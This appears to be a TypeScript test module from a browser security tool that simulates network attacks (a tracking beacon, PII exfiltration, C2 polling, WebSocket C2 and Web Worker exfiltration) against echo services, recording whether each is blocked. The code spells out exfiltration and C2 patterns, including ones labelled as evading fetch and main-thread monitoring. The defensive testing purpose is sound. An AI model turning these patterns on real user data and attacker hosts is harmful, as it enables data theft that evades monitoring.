import type { AttackResult, AttackTest } from "../types.js";

async function simulateBeacon(): Promise<AttackResult> {
  const startTime = performance.now();

  try {
    const response = await fetch("https://httpbin.org/post", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        type: "tracking_beacon",
        timestamp: Date.now(),
        userAgent: navigator.userAgent,
      }),
    });

    const executionTime = performance.now() - startTime;

    return {
      blocked: false,
      executionTime,
      details: `Beacon sent successfully (status: ${response.status})`,
    };
  } catch (error) {
    const executionTime = performance.now() - startTime;
    const errorMessage = error instanceof Error ? error.message : String(error);

    return {
      blocked: errorMessage.includes("blocked") || errorMessage.includes("ERR_BLOCKED"),
      executionTime,
      details: `Request failed: ${errorMessage}`,
      error: errorMessage,
    };
  }
}

async function simulateDataExfiltration(): Promise<AttackResult> {
  const startTime = performance.now();

  const sensitiveData = {
    email: "test@example.com",
    creditCard: "4111-1111-1111-1111",
    ssn: "123-45-6789",
    password: "password123",
    timestamp: Date.now(),
  };

  try {
    const response = await fetch("https://httpbin.org/post", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(sensitiveData),
    });

    const executionTime = performance.now() - startTime;

    return {
      blocked: false,
      executionTime,
      details: `Data exfiltration simulated (status: ${response.status})`,
    };
  } catch (error) {
    const executionTime = performance.now() - startTime;
    const errorMessage = error instanceof Error ? error.message : String(error);

    return {
      blocked: true,
      executionTime,
      details: `Data exfiltration blocked: ${errorMessage}`,
      error: errorMessage,
    };
  }
}

async function simulateC2Communication(): Promise<AttackResult> {
  const startTime = performance.now();

  try {
    const response = await fetch("https://jsonplaceholder.typicode.com/posts/1");
    const data = await response.json();

    const executionTime = performance.now() - startTime;

    return {
      blocked: false,
      executionTime,
      details: `C2 polling successful, received ${JSON.stringify(data).length} bytes`,
    };
  } catch (error) {
    const executionTime = performance.now() - startTime;
    const errorMessage = error instanceof Error ? error.message : String(error);

    return {
      blocked: true,
      executionTime,
      details: `C2 communication blocked: ${errorMessage}`,
      error: errorMessage,
    };
  }
}

async function simulateWebSocketC2(): Promise<AttackResult> {
  const startTime = performance.now();

  return new Promise((resolve) => {
    try {
      const ws = new WebSocket("wss://echo.websocket.org/");
      let resolved = false;

      const timeout = setTimeout(() => {
        if (!resolved) {
          resolved = true;
          ws.close();
          resolve({
            blocked: false,
            executionTime: performance.now() - startTime,
            details: "WebSocket connection timed out (potential stealth success)",
          });
        }
      }, 5000);

      ws.onopen = () => {
        ws.send(
          JSON.stringify({
            type: "c2_checkin",
            hostname: "victim-browser",
            timestamp: Date.now(),
          })
        );
      };

      ws.onmessage = (event) => {
        if (!resolved) {
          resolved = true;
          clearTimeout(timeout);
          ws.close();
          resolve({
            blocked: false,
            executionTime: performance.now() - startTime,
            details: `WebSocket C2 communication successful: ${event.data.length} bytes echoed`,
          });
        }
      };

      ws.onerror = () => {
        if (!resolved) {
          resolved = true;
          clearTimeout(timeout);
          resolve({
            blocked: true,
            executionTime: performance.now() - startTime,
            details: "WebSocket connection blocked or failed",
          });
        }
      };
    } catch (error) {
      const errorMessage = error instanceof Error ? error.message : String(error);
      resolve({
        blocked: true,
        executionTime: performance.now() - startTime,
        details: `WebSocket C2 blocked: ${errorMessage}`,
        error: errorMessage,
      });
    }
  });
}

async function simulateWebWorkerExfil(): Promise<AttackResult> {
  const startTime = performance.now();

  try {
    const workerCode = `
      self.onmessage = async (e) => {
        try {
          const response = await fetch('https://httpbin.org/post', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ exfil: e.data, workerExfil: true })
          });
          self.postMessage({ success: true, status: response.status });
        } catch (err) {
          self.postMessage({ success: false, error: err.message });
        }
      };
    `;

    const blob = new Blob([workerCode], { type: "application/javascript" });
    const workerUrl = URL.createObjectURL(blob);
    const worker = new Worker(workerUrl);

    return new Promise((resolve) => {
      const timeout = setTimeout(() => {
        worker.terminate();
        URL.revokeObjectURL(workerUrl);
        resolve({
          blocked: false,
          executionTime: performance.now() - startTime,
          details: "Web Worker exfiltration timed out (worker may be blocked)",
        });
      }, 5000);

      worker.onmessage = (e) => {
        clearTimeout(timeout);
        worker.terminate();
        URL.revokeObjectURL(workerUrl);

        if (e.data.success) {
          resolve({
            blocked: false,
            executionTime: performance.now() - startTime,
            details: `Web Worker exfiltration successful (status: ${e.data.status})`,
          });
        } else {
          resolve({
            blocked: true,
            executionTime: performance.now() - startTime,
            details: `Web Worker fetch blocked: ${e.data.error}`,
          });
        }
      };

      worker.onerror = (err) => {
        clearTimeout(timeout);
        worker.terminate();
        URL.revokeObjectURL(workerUrl);
        resolve({
          blocked: true,
          executionTime: performance.now() - startTime,
          details: `Web Worker creation blocked: ${err.message}`,
        });
      };

      worker.postMessage({
        sensitiveData: "stolen-credentials-from-worker",
        timestamp: Date.now(),
      });
    });
  } catch (error) {
    const errorMessage = error instanceof Error ? error.message : String(error);
    return {
      blocked: true,
      executionTime: performance.now() - startTime,
      details: `Web Worker exfiltration blocked: ${errorMessage}`,
      error: errorMessage,
    };
  }
}

export const networkAttacks: AttackTest[] = [
  {
    id: "network-beacon",
    name: "Tracking Beacon",
    category: "network",
    description: "Sends a tracking beacon to an external server with user info",
    severity: "high",
    simulate: simulateBeacon,
  },
  {
    id: "network-exfiltration",
    name: "Data Exfiltration",
    category: "network",
    description: "Attempts to send sensitive data (PII) to an external server",
    severity: "critical",
    simulate: simulateDataExfiltration,
  },
  {
    id: "network-c2",
    name: "C2 Communication",
    category: "network",
    description: "Simulates command-and-control server polling",
    severity: "critical",
    simulate: simulateC2Communication,
  },
  {
    id: "network-websocket-c2",
    name: "WebSocket C2 Communication",
    category: "network",
    description: "Establishes WebSocket connection for C2 communication (bypasses fetch monitoring)",
    severity: "critical",
    simulate: simulateWebSocketC2,
  },
  {
    id: "network-webworker-exfil",
    name: "Web Worker Exfiltration",
    category: "network",
    description: "Uses Web Worker to exfiltrate data (bypasses main thread monitoring)",
    severity: "critical",
    simulate: simulateWebWorkerExfil,
  },
];
